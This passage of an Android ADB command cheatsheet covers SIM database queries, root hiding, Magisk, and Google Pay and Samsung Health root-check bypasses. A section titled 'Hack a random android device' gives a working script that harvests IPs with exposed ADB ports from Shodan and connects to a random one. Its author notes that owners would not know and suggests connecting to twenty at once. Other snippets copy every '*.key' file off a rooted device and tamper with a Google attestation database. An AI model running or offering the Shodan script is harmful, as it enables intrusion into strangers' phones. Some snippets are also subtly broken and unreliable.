```
```
icc_id = 8946209802SSSSSSSSS
card_id = 8946209802SSSSSSSSS
display_name = CARD
mcc = 0
mnc = 0

icc_id = 8946209802SSSSSSSSS
card_id = 8946209802SSSSSSSSS
carrier_name = Telia
display_name = Telia
mcc = 240
mnc = 7
```

#### Print ICCID
```sh
sqlite3 /data/vendor/radio/qcril.db 'select ICCID from qcril_manual_prov_table'
```
#### Print Carrier Name, ICC ID, MCC, Card ID and everything that is stored from sim:
```bash
sqlite3 -line /data/user_de/0/com.android.providers.telephony/databases/telephony.db 'select * from siminfo'  
```
```
                              _id = 1
                           icc_id = xxxxxxxxxxxxxxxxxxxx
                           sim_id = 1
                     display_name = Comviq
                     carrier_name = Comviq
                      name_source = 3
                            color = -XXXXXX
                           number = 
            display_number_format = 1
                     data_roaming = 1
                              mcc = 240
                              mnc = 7
                       mcc_string = 240
                       mnc_string = 07
                          ehplmns = 24xxx,24xxx,24xxx
                           hplmns = 24xxx,24xxx,24xxx,24xxx
          sim_provisioning_status = 0
                      is_embedded = 1
                          card_id = xxxxxxxxxxxxxxxxxxxx
                     access_rules = 
access_rules_from_carrier_configs = 
                     is_removable = 0
enable_cmas_extreme_threat_alerts = 1
 enable_cmas_severe_threat_alerts = 1
         enable_cmas_amber_alerts = 1
          enable_emergency_alerts = 1
             alert_sound_duration = 4
          alert_reminder_interval = 0
             enable_alert_vibrate = 1
              enable_alert_speech = 1
          enable_etws_test_alerts = 0
         enable_channel_50_alerts = 1
          enable_cmas_test_alerts = 0
         show_cmas_opt_out_dialog = 1
                 volte_vt_enabled = 1
                   vt_ims_enabled = 1
                  wfc_ims_enabled = 1
                     wfc_ims_mode = 1
             wfc_ims_roaming_mode = -1
          wfc_ims_roaming_enabled = -1
                 is_opportunistic = 0
                       group_uuid = 
                       is_metered = 1
                 iso_country_code = se
                       carrier_id = 1696
                    profile_class = 2
                subscription_type = 0
                      group_owner = 
      data_enabled_override_rules = 
                             imsi = xxxxxxxxxxxxxxxx
        uicc_applications_enabled = 1
            allowed_network_types = -1
              ims_rcs_uce_enabled = 0
        cross_sim_calling_enabled = 0
                       rcs_config = 
allowed_network_types_for_reasons = user=xxxxxxx
              voims_opt_in_status = 0
               d2d_sharing_status = 0
             d2d_sharing_contacts = 
```

#### Print data in .db files, clean:
```bash
grep -vx -f <(sqlite3 Main.db .dump) <(sqlite3 ${DB} .schema) 
```
#### Use below command fr update dg.db file:
```bash          
sqlite3 /data/data/com.google.android.gms/databases/dg.db "update main set c='0' where a like '%attest%';" 
```
#### Grab all file extensions of a kind and download to PC
```bash
for i in `"su -c find /data /system -name '*.key'"`; do 
   mkdir -p ".`dirname $i`";"su -c cat $i" > ".$i";
done
```
#### Print uptime for your device by days + time

```sh
TZ=UTC date -d@$(cut -d\  -f1 /proc/uptime) +'%j %T' \
    |awk '{print $1-1"d",$2}'
```

## Android <small>paths</small>

```
/data/ssh
/data/adb/magisk
/data/data/<package>/databases (app databases)
/data/data/<package>/shared_prefs/ (shared preferences)
/data/app (apk installed by user)
/system/app (pre-installed APK files)
/mmt/asec (encrypted apps) (App2SD)
/mmt/emmc (internal SD Card)
/mmt/adcard (external/Internal SD Card)
/mmt/adcard/external_sd (external SD Card)
```     

## Android <small>root</small>

Commands for rooted devices

#### Find out if the device is rooted and if su exist
```bash
which su &> /dev/null
if [[ $? = "0" ]]; then
    echo "Device Rooted: 
else
    echo "Device Rooted: No"
fi
```

#### Bypass Google Pay Block for Rooted Devices

```bash
adb shell am force-stop \
    /data/data/com.google.android.apps.walletnfcrel

## Hide root for Google applications:
for google_apps in $(cmd package list packages|grep -i com.google |cut -d: -f2); do 
    magiskhide add ${google_apps}; 
done    

## Change permissions on dg.db to read-and-write:
su sh -c chmod 0777 /data/data/com.google.android.gms/databases/dg.db

# Now change permissions on dg.db to 0444
chmod 0444 /data/data/com.google.android.gms/databases/dg.db
```


#### Grab all file extensions of a kind and pull them all to your pc

```sh
for i in `"su -c find /data /system -name '*.key'"`; do 
   mkdir -p ".`dirname $i`";"su -c cat $i" > ".$i";
done
```

## Android <small>wuseman's notices</small>

Find out happens when we remove below file

```sh
rm /data/misc/bootstat/boot_complete?
```
## Android <small>magisk</small> (updated version - zygisk - comming soon)

..... will be added very soon.

## Android <small>magisk</small> (older versions)

#### Enable magiskhide

     /sbin/magisk magiskhide enable
     
#### List hided apps by magisk 

    /sbin/magisk magiskhide list

#### Add package to magiskhide

     /sbin/magisk magiskhide add com.package
    
## ADB Shell <small>commands sorted by brand</small>

Samsung

Bypass Samsung Health block on rooted samsung devices 
(Old Method, wont work on latest updates from samsung health)

```bash
mount -o rw,remount /system/etc/mkshrc
sed -i 's/ro.config.tima=1/ro.config.tima=0/g' build.prop
```
#### If you can't use smart view 2 to stream your screen to other devices, use below trick: 
```bash
mount -o rw,remount /
printf '%s\n' \
     # Fix for smartview on rooted devices, android 12" \
     wlan.wfd.hdcp=disable" >> /system/build.prop
    reboot
``` 
## ADB Shell <small>screencap</small>
```bash  
adb shell screencap /storage/emulated/0/Pictures/screenshot.png
```

## ADB Shell <small>screenrecord</small>

```bash
adb shell screenrecord --time-limit 10 /storage/emulated/0/Video/record.mp4
```

## Hack a random android device (ON YOUR OWN RISK)

#### You need to connect to your device via `adb connect`

```bash
adb connect <ip>:<port> 
```

#### First you need to enable tcp mode as below with usb cable connected

* Plugin  USB and execute

```bash
adb tcpip 5555
```

* Remove USB Cable and connect to your device via network:

```bash
adb connect <ip>:5555
```

* Now you can work with your device via network, enter shell as usual:

```bash
adb shell
```

> ⚠ WARNING: *Don't forget to `DISCONNECT` when you have finished debugging.
You can be in danger and may be listed at shodan.io and other sites similiar to shodan if you will keep tcpip be running in background. We can find your device via a simple portscan via masscan or similiar tools, so use below command when you are done in shell:


```bash    
adb disconnect 
```

### To show you the danger with keep tcp mode running, for more tips to stay safe you can visit the below url for get latest commands since some are out of date I see here:

[https://wuseman.github.io/adb-cheatsheet/](https://wuseman.github.io/adb-cheatsheet/)

* You can copy and paste in any terminal and you are connected to a random device that has tcpip running without device owners knowledge, there is no way to figure out wihtout list connected devices ON the device. Therefore, take my warning seriously! Within ~1-3 seconds you have connected to a device. 

Now imagine if we use xargs -n1 -P20, then we connect to 20 device at same time. So be careful!!

```bash
# Port for ABD
PORT="5555"

# Shodan FILTER:
FILTER="android+debug+bridge"

# Source URL:
TARGETS="https://www.shodan.io/search?query=${FILTER}"

function findTargets() {
curl -sL ${TARGETS}|awk '!seen[$0]++'               \
        |grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" \
        |awk '!seen[$0]++'  |tee wadb-attack.log
}

function adbConnect() {
grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" wadb-attack.log \
        |sed 's/$/:5555/g'|tee target.txt
        shuf -n1  target.txt \
        |xargs adb connect
}

findTargets
adbConnect
```

###### Above script is shared for educational purposes, wuseman cannot be held responsible for other users' use of the above script 

// wuseman

## Android FRP BYpass by <small>wuseman</small>
* [wuseman - Samsung Galaxy A10](https://github.com/wuseman/Samsung_Galaxy.A10_FRP.Bypass)
* [wuseman - Samsung Galaxy A10](https://github.com/wuseman/Samsung_Galaxy.A10_Rooting)
* [wuseman - Samsung Galaxy A5](https://github.com/wuseman/Samsung_Galaxy.A5_FRP.Bypass)
* [wuseman - Samsung Galaxy S10](https://github.com/wuseman/Samsung_Galaxy.s10_FRP.Bypass)
* [wuseman - Samsung Galaxy S8](https://github.com/wuseman/Samsung_Galaxy.S8-FRP.Bypass)
* [wuseman - Samsung Galaxy Xcover 4](https://github.com/wuseman/Samsung.Xcover.4-FrpBypass)
* [wuseman - Motorola Moto E4 Plus](https://github.com/wuseman/Motorola_Moto_E4.Plus.v7.1-FRP_BYPASS)
* [wuseman - Huawei MediaTab T5](https://github.com/wuseman/Huawei_Mediatab-T5-FRP-Bypass_V8.0) 
* [wuseman - LG G6](https://github.com/wuseman/LG_G6-FRP-Bypass)

## Awesome Resources for <small>ADB</small>

For Working with Android devices via commandline 

## Gentoo Wiki 

* [Gentoo Wiki - ADB](https://wiki.gentoo.org/wiki/Android/adb)

## ADB Shell

* [Android™ Developer - Emulator Console](https://developer.android.com/studio/run/emulator-console)
* [Android™ Developer - Write your app](https://developer.android.com/studio/write)
* [Android™ Google Source - Source Code](https://android.googlesource.com/)
* [Android™ Google Source - CMD Command](https://android.googlesource.com/platform/frameworks/native/+/master/cmds/cmd/)
* [Android™ Generic Project](https://android-generic.github.io/#documentation)
* [Android™ GDB](https://source.android.com/devices/tech/debug/gdb)
* [Android™ Source - Understand Logging](https://source.android.com/devices/tech/debug/understanding-logging)
* [Android™ Source - Network Connectivity Tests](https://source.android.com/devices/tech/connect/connect_tests)
* [Android™ Platform Tools](https://android.googlesource.com/platform/prebuilts/cmdline-tools/+/34a182b3646de1051ea2c9b23132d073bcaa5087/tools/bin/) 
* [Github Randorise - Mobile Hacking CheatSheet](https://github.com/randorisec/MobileHackingCheatSheet)
* [Mazhuang - Awesome ADB - Another Cheatsheet Wiki](https://mazhuang.org/awesome-adb/README.en.html)
* [Jfsso - Preferences Editor](https://github.com/jfsso/PreferencesEditor)
* [Nahamsec - Resources For Beginner - Bug Bounty Hunters](https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/blob/master/assets/mobile.md)
* [Raywenderlich -Forensic Artifacts](https://www.raywenderlich.com/3419415-hack-an-android-app-finding-forensic-artifacts#toc-anchor-002)
* [Noobsec - Bypass Fingerprint Lock In Just 1 Second](https://noobsec.org/project/2019-12-22-bypass-fingerprint-lock-in-just-1-second/)
* [Noobsec - Cara Reverse Engineering](https://noobsec.org/project/2018-11-04-cara-reverse-engineering-apk/)
* [Oracle- JVMS](https://docs.oracle.com/javase/specs/jvms/se9/html/jvms-4.html)
* [Tjtech - Analyze OEM Unlocking Under Android](http://tjtech.me/analyze-oem-unlocking-under-android.html)
* [U'Smile - How to change the IMEI on Android devices](https://usmile.at/blog/how-to-change-imei-on-android-devices)
* [Android™ Q Navigation - Gesture Controls](https://www.xda-developers.com/android-q-navigation-gesture-controls/#fitvid892986)
* [Good review for clipboard control](https://www.smartspate.com/how-to-copy-text-from-the-clipboard-to-android-devices/)
      
#### Wannabes that stole this wiki and claim they wrote this wiki, go f*ck yourself!
      
1) Srinoib is a noob:  https://github.com/Srinoid/ADB_COMMANDS
      
## Wiki <small>author</small>

* wuseman [wuseman@nr1.nu](mailto:wuseman@nr1.nu)

## Wiki <small>License</small>

Android Nr1 nu wiki is licensed under the GNU General Public License v3.0 - See the [LICENSE.md](LICENSE.md) file for details

* Glad you made it until the end of this README, I hope you found something useful here and 
* now you have taken a step closer to becoming a master in working with androdi debug shell via commandline

// wuseman
